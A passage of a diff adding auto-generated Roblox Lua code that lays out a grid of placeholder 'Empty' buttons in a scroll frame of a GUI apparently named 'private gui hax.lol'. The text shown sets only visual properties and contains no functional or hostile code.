+G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["bf"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["bf"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["bf"]["Text"] = [[Empty]];
+G2L["bf"]["Name"] = [[Button]];
+G2L["bf"]["Position"] = UDim2.new(-2.66782, 0, 14.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c0"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c0"]["TextWrapped"] = true;
+G2L["c0"]["BorderSizePixel"] = 3;
+G2L["c0"]["TextSize"] = 14;
+G2L["c0"]["TextScaled"] = true;
+G2L["c0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c0"]["Text"] = [[Empty]];
+G2L["c0"]["Name"] = [[Button]];
+G2L["c0"]["Position"] = UDim2.new(-1.35203, 0, 14.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c1"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c1"]["TextWrapped"] = true;
+G2L["c1"]["BorderSizePixel"] = 3;
+G2L["c1"]["TextSize"] = 14;
+G2L["c1"]["TextScaled"] = true;
+G2L["c1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c1"]["Text"] = [[Empty]];
+G2L["c1"]["Name"] = [[Button]];
+G2L["c1"]["Position"] = UDim2.new(-0.00466, 0, 14.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c2"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c2"]["TextWrapped"] = true;
+G2L["c2"]["BorderSizePixel"] = 3;
+G2L["c2"]["TextSize"] = 14;
+G2L["c2"]["TextScaled"] = true;
+G2L["c2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c2"]["Text"] = [[Empty]];
+G2L["c2"]["Name"] = [[Button]];
+G2L["c2"]["Position"] = UDim2.new(-5.30993, 0, 15.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c3"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c3"]["TextWrapped"] = true;
+G2L["c3"]["BorderSizePixel"] = 3;
+G2L["c3"]["TextSize"] = 14;
+G2L["c3"]["TextScaled"] = true;
+G2L["c3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c3"]["Text"] = [[Empty]];
+G2L["c3"]["Name"] = [[Button]];
+G2L["c3"]["Position"] = UDim2.new(-4.02571, 0, 15.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c4"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c4"]["TextWrapped"] = true;
+G2L["c4"]["BorderSizePixel"] = 3;
+G2L["c4"]["TextSize"] = 14;
+G2L["c4"]["TextScaled"] = true;
+G2L["c4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c4"]["Text"] = [[Empty]];
+G2L["c4"]["Name"] = [[Button]];
+G2L["c4"]["Position"] = UDim2.new(-2.66782, 0, 15.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c5"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c5"]["TextWrapped"] = true;
+G2L["c5"]["BorderSizePixel"] = 3;
+G2L["c5"]["TextSize"] = 14;
+G2L["c5"]["TextScaled"] = true;
+G2L["c5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c5"]["Text"] = [[Empty]];
+G2L["c5"]["Name"] = [[Button]];
+G2L["c5"]["Position"] = UDim2.new(-1.35203, 0, 15.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c6"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c6"]["TextWrapped"] = true;
+G2L["c6"]["BorderSizePixel"] = 3;
+G2L["c6"]["TextSize"] = 14;
+G2L["c6"]["TextScaled"] = true;
+G2L["c6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c6"]["Text"] = [[Empty]];
+G2L["c6"]["Name"] = [[Button]];
+G2L["c6"]["Position"] = UDim2.new(-0.00466, 0, 15.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c7"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c7"]["TextWrapped"] = true;
+G2L["c7"]["BorderSizePixel"] = 3;
+G2L["c7"]["TextSize"] = 14;
+G2L["c7"]["TextScaled"] = true;
+G2L["c7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c7"]["Text"] = [[Empty]];
+G2L["c7"]["Name"] = [[Button]];
+G2L["c7"]["Position"] = UDim2.new(-5.30993, 0, 16.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c8"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c8"]["TextWrapped"] = true;
+G2L["c8"]["BorderSizePixel"] = 3;
+G2L["c8"]["TextSize"] = 14;
+G2L["c8"]["TextScaled"] = true;
+G2L["c8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c8"]["Text"] = [[Empty]];
+G2L["c8"]["Name"] = [[Button]];
+G2L["c8"]["Position"] = UDim2.new(-4.02571, 0, 16.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["c9"] = Instance.new("TextButton", G2L["7a"]);
+G2L["c9"]["TextWrapped"] = true;
+G2L["c9"]["BorderSizePixel"] = 3;
+G2L["c9"]["TextSize"] = 14;
+G2L["c9"]["TextScaled"] = true;
+G2L["c9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["c9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c9"]["Text"] = [[Empty]];
+G2L["c9"]["Name"] = [[Button]];
+G2L["c9"]["Position"] = UDim2.new(-2.66782, 0, 16.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ca"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ca"]["TextWrapped"] = true;
+G2L["ca"]["BorderSizePixel"] = 3;
+G2L["ca"]["TextSize"] = 14;
+G2L["ca"]["TextScaled"] = true;
+G2L["ca"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ca"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ca"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ca"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ca"]["Text"] = [[Empty]];
+G2L["ca"]["Name"] = [[Button]];
+G2L["ca"]["Position"] = UDim2.new(-1.35203, 0, 16.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["cb"] = Instance.new("TextButton", G2L["7a"]);
+G2L["cb"]["TextWrapped"] = true;
+G2L["cb"]["BorderSizePixel"] = 3;
+G2L["cb"]["TextSize"] = 14;
+G2L["cb"]["TextScaled"] = true;
+G2L["cb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["cb"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["cb"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["cb"]["Text"] = [[Empty]];
+G2L["cb"]["Name"] = [[Button]];
+G2L["cb"]["Position"] = UDim2.new(-0.00466, 0, 16.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["cc"] = Instance.new("TextButton", G2L["7a"]);
+G2L["cc"]["TextWrapped"] = true;
+G2L["cc"]["BorderSizePixel"] = 3;
+G2L["cc"]["TextSize"] = 14;
+G2L["cc"]["TextScaled"] = true;
+G2L["cc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["cc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["cc"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["cc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["cc"]["Text"] = [[Empty]];
+G2L["cc"]["Name"] = [[Button]];
+G2L["cc"]["Position"] = UDim2.new(-5.30993, 0, 18.39384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["cd"] = Instance.new("TextButton", G2L["7a"]);
+G2L["cd"]["TextWrapped"] = true;
+G2L["cd"]["BorderSizePixel"] = 3;
+G2L["cd"]["TextSize"] = 14;
+G2L["cd"]["TextScaled"] = true;
+G2L["cd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["cd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["cd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["cd"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["cd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["cd"]["Text"] = [[Empty]];
+G2L["cd"]["Name"] = [[Button]];
+G2L["cd"]["Position"] = UDim2.new(-4.02571, 0, 18.39384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ce"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ce"]["TextWrapped"] = true;
+G2L["ce"]["BorderSizePixel"] = 3;
+G2L["ce"]["TextSize"] = 14;
+G2L["ce"]["TextScaled"] = true;
+G2L["ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ce"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ce"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ce"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ce"]["Text"] = [[Empty]];
+G2L["ce"]["Name"] = [[Button]];
+G2L["ce"]["Position"] = UDim2.new(-2.66782, 0, 18.39384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["cf"] = Instance.new("TextButton", G2L["7a"]);
+G2L["cf"]["TextWrapped"] = true;
+G2L["cf"]["BorderSizePixel"] = 3;
+G2L["cf"]["TextSize"] = 14;
+G2L["cf"]["TextScaled"] = true;
+G2L["cf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["cf"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["cf"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["cf"]["Text"] = [[Empty]];
+G2L["cf"]["Name"] = [[Button]];
+G2L["cf"]["Position"] = UDim2.new(-1.35203, 0, 18.39384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d0"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d0"]["TextWrapped"] = true;
+G2L["d0"]["BorderSizePixel"] = 3;
+G2L["d0"]["TextSize"] = 14;
+G2L["d0"]["TextScaled"] = true;
+G2L["d0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d0"]["Text"] = [[Empty]];
+G2L["d0"]["Name"] = [[Button]];
+G2L["d0"]["Position"] = UDim2.new(-0.00466, 0, 18.39384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d1"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d1"]["TextWrapped"] = true;
+G2L["d1"]["BorderSizePixel"] = 3;
+G2L["d1"]["TextSize"] = 14;
+G2L["d1"]["TextScaled"] = true;
+G2L["d1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d1"]["Text"] = [[Empty]];
+G2L["d1"]["Name"] = [[Button]];
+G2L["d1"]["Position"] = UDim2.new(-5.30993, 0, 19.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d2"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d2"]["TextWrapped"] = true;
+G2L["d2"]["BorderSizePixel"] = 3;
+G2L["d2"]["TextSize"] = 14;
+G2L["d2"]["TextScaled"] = true;
+G2L["d2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d2"]["Text"] = [[Empty]];
+G2L["d2"]["Name"] = [[Button]];
+G2L["d2"]["Position"] = UDim2.new(-4.02571, 0, 19.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d3"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d3"]["TextWrapped"] = true;
+G2L["d3"]["BorderSizePixel"] = 3;
+G2L["d3"]["TextSize"] = 14;
+G2L["d3"]["TextScaled"] = true;
+G2L["d3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d3"]["Text"] = [[Empty]];
+G2L["d3"]["Name"] = [[Button]];
+G2L["d3"]["Position"] = UDim2.new(-2.66782, 0, 19.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d4"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d4"]["TextWrapped"] = true;
+G2L["d4"]["BorderSizePixel"] = 3;
+G2L["d4"]["TextSize"] = 14;
+G2L["d4"]["TextScaled"] = true;
+G2L["d4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d4"]["Text"] = [[Empty]];
+G2L["d4"]["Name"] = [[Button]];
+G2L["d4"]["Position"] = UDim2.new(-1.35203, 0, 19.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d5"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d5"]["TextWrapped"] = true;
+G2L["d5"]["BorderSizePixel"] = 3;
+G2L["d5"]["TextSize"] = 14;
+G2L["d5"]["TextScaled"] = true;
+G2L["d5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d5"]["Text"] = [[Empty]];
+G2L["d5"]["Name"] = [[Button]];
+G2L["d5"]["Position"] = UDim2.new(-0.00466, 0, 19.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d6"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d6"]["TextWrapped"] = true;
+G2L["d6"]["BorderSizePixel"] = 3;
+G2L["d6"]["TextSize"] = 14;
+G2L["d6"]["TextScaled"] = true;
+G2L["d6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d6"]["Text"] = [[Empty]];
+G2L["d6"]["Name"] = [[Button]];
+G2L["d6"]["Position"] = UDim2.new(-5.30993, 0, 21.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d7"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d7"]["TextWrapped"] = true;
+G2L["d7"]["BorderSizePixel"] = 3;
+G2L["d7"]["TextSize"] = 14;
+G2L["d7"]["TextScaled"] = true;
+G2L["d7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d7"]["Text"] = [[Empty]];
+G2L["d7"]["Name"] = [[Button]];
+G2L["d7"]["Position"] = UDim2.new(-4.02571, 0, 21.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d8"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d8"]["TextWrapped"] = true;
+G2L["d8"]["BorderSizePixel"] = 3;
+G2L["d8"]["TextSize"] = 14;
+G2L["d8"]["TextScaled"] = true;
+G2L["d8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d8"]["Text"] = [[Empty]];
+G2L["d8"]["Name"] = [[Button]];
+G2L["d8"]["Position"] = UDim2.new(-2.66782, 0, 21.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["d9"] = Instance.new("TextButton", G2L["7a"]);
+G2L["d9"]["TextWrapped"] = true;
+G2L["d9"]["BorderSizePixel"] = 3;
+G2L["d9"]["TextSize"] = 14;
+G2L["d9"]["TextScaled"] = true;
+G2L["d9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["d9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["d9"]["Text"] = [[Empty]];
+G2L["d9"]["Name"] = [[Button]];
+G2L["d9"]["Position"] = UDim2.new(-1.35203, 0, 21.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["da"] = Instance.new("TextButton", G2L["7a"]);
+G2L["da"]["TextWrapped"] = true;
+G2L["da"]["BorderSizePixel"] = 3;
+G2L["da"]["TextSize"] = 14;
+G2L["da"]["TextScaled"] = true;
+G2L["da"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["da"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["da"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["da"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["da"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["da"]["Text"] = [[Empty]];
+G2L["da"]["Name"] = [[Button]];
+G2L["da"]["Position"] = UDim2.new(-0.00466, 0, 21.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["db"] = Instance.new("TextButton", G2L["7a"]);
+G2L["db"]["TextWrapped"] = true;
+G2L["db"]["BorderSizePixel"] = 3;
+G2L["db"]["TextSize"] = 14;
+G2L["db"]["TextScaled"] = true;
+G2L["db"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["db"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["db"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["db"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["db"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["db"]["Text"] = [[Empty]];
+G2L["db"]["Name"] = [[Button]];
+G2L["db"]["Position"] = UDim2.new(-5.30993, 0, 22.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["dc"] = Instance.new("TextButton", G2L["7a"]);
+G2L["dc"]["TextWrapped"] = true;
+G2L["dc"]["BorderSizePixel"] = 3;
+G2L["dc"]["TextSize"] = 14;
+G2L["dc"]["TextScaled"] = true;
+G2L["dc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["dc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["dc"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["dc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["dc"]["Text"] = [[Empty]];
+G2L["dc"]["Name"] = [[Button]];
+G2L["dc"]["Position"] = UDim2.new(-4.02571, 0, 22.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["dd"] = Instance.new("TextButton", G2L["7a"]);
+G2L["dd"]["TextWrapped"] = true;
+G2L["dd"]["BorderSizePixel"] = 3;
+G2L["dd"]["TextSize"] = 14;
+G2L["dd"]["TextScaled"] = true;
+G2L["dd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["dd"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["dd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["dd"]["Text"] = [[Empty]];
+G2L["dd"]["Name"] = [[Button]];
+G2L["dd"]["Position"] = UDim2.new(-2.66782, 0, 22.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["de"] = Instance.new("TextButton", G2L["7a"]);
+G2L["de"]["TextWrapped"] = true;
+G2L["de"]["BorderSizePixel"] = 3;
+G2L["de"]["TextSize"] = 14;
+G2L["de"]["TextScaled"] = true;
+G2L["de"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["de"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["de"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["de"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["de"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["de"]["Text"] = [[Empty]];
+G2L["de"]["Name"] = [[Button]];
+G2L["de"]["Position"] = UDim2.new(-1.35203, 0, 22.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
